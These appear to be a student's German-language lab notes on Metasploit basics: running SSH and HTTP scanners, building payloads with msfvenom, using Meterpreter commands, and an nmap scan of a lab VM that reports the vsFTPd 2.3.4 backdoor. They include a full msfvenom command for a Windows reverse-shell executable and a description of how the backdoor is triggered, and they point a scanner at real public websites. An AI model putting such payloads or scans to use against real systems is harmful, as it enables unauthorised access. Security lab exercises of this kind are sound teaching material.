# Gemeinsame Übung (Metasploit)

**$ msfconsole**  
Um MSFCONSOLE zu öffen und darin arbeiten zu können  

## SSH Version:
* `search -h` → Zeigt Hilfe an, wie man den search-Befehl benutzen kann.
* `search ssh` → Sucht alle Module, die etwas mit SSH zu tun haben.
* `search scanner/ssh` → Sucht nach SSH-Scannern.
* `search type:auxiliary name:ssh` → Sucht nach Zusatz-Modulen (auxiliary), die SSH im Namen haben.
* `info auxiliary/scanner/ssh/ssh_version` → Zeigt Infos über das Modul „ssh_version“ an (was es macht usw.).
* `use auxiliary/scanner/ssh/ssh_version` → Wählt dieses Modul aus, damit man es benutzen kann.
* `options` → Zeigt die Einstellungen, die man noch festlegen kann.
* `set RHOSTS <target IP>` → Trägt die Ziel-IP ein, die man scannen will.
* `run` → Startet das Modul und führt den Scan aus.

## http Title:
* `use auxiliary/scanner/http/title` → Wählt das Modul aus, das den Titel einer Webseite ausliest.
* `info` → Zeigt Infos darüber an, was das Modul genau macht.
* `options` → Zeigt die Einstellungen, die man setzen kann (z. B. Zieladresse).
* `set RHOSTS <target IP>` → Trägt die IP-Adresse oder Webseite ein, die man scannen will.
* `run` → Startet den Scan.
* `set RHOSTS www.orf.at` → Setzt als Ziel die Webseite [www.orf.at](http://www.orf.at).
* `run` → Startet den Scan für [www.orf.at](http://www.orf.at).
* `set RHOSTS www.htl-braunau.at` → Setzt als Ziel die Webseite [www.htl-braunau.at](http://www.htl-braunau.at).
* `run` → Startet den Scan für [www.htl-braunau.at](http://www.htl-braunau.at).

# Übung (msf Basics)
## msfvenom
ist ein Tool von Metasploit, mit dem man Payloads erstellt

* `-p` → Welche Payload man will
* `LHOST` → Eigene IP-Adresse
* `LPORT` → Eigener Port
* `-f` → Dateiformat (z. B. exe, elf, raw)
* `-o` → Dateiname

**BSP:**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.13.52 LPORT=4444 -f exe -o shell.exe
```

* Erstellt eine Windows-Datei
* Baut eine Reverse-Verbindung auf
* Speichert sie als shell.exe

## Meterpreter
ist eine spezielle Payload von Metasploit.
Sie läuft im Arbeitsspeicher und gibt viele Steuerungsmöglichkeiten über das Zielsystem.

* `sysinfo` → Zeigt Infos über das System
* `getuid` → Zeigt aktuellen Benutzer
* `ls` → Zeigt Dateien
* `cd` → Ordner wechseln
* `download` → Datei herunterladen
* `upload` → Datei hochladen
* `screenshot` → Screenshot machen
* `exit` → Verbindung beenden

# Übung (nmap FTP scan)
nmap -p 21 --script=vuln 192.168.13.51 (meta vmware)

```
msf6 > nmap -p 21 --script=vuln 192.168.13.51
[*] exec: nmap -p 21 --script=vuln 192.168.13.51
 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-23 06:47 EST
Nmap scan report for 192.168.13.51
Host is up (0.0010s latency).
 
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://www.securityfocus.com/bid/48539
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
MAC Address: 00:0C:29:E8:9C:5D (VMware)
 
Nmap done: 1 IP address (1 host up) scanned in 11.36 seconds
```

CVE-NUMMER: CVE-2011-2523 

Bei dieser Version wurde eine manipulierte Version des FTP‑Servers veröffentlicht.

Wenn man sich mit einem speziellen Benutzernamen anmeldet (mit :) am Ende), dann:

1. wird im Hintergrund eine Backdoor aktiviert
2. Port 6200 öffnet sich
3. man kann Zugriff auf das System bekommen
=> Das ist eine absichtlich eingebaute Backdoor.

## „Intrusive“ bedeutet:  
* Sie greifen aktiv in das System ein
* Sie können Dienste abstürzen lassen
* Sie erzeugen viel auffälligen Netzwerkverkehr
* Sie können Logs oder Sicherheitsalarme auslösen

## Warum laufen sie nicht bei `-sC` oder `-A`  
-sC → Führt nur safe/default Skripte aus   
-A → Macht Versionserkennung + OS-Erkennung + default Skripte   
 
**Intrusive** Skripte gehören nicht zu den default Skripten, 
weil sie: 
* Systeme beschädigen könnten
* rechtlich problematisch sein können
* nicht „unauffällig“ sind

# Übung (msf FTP Version herausfinden)







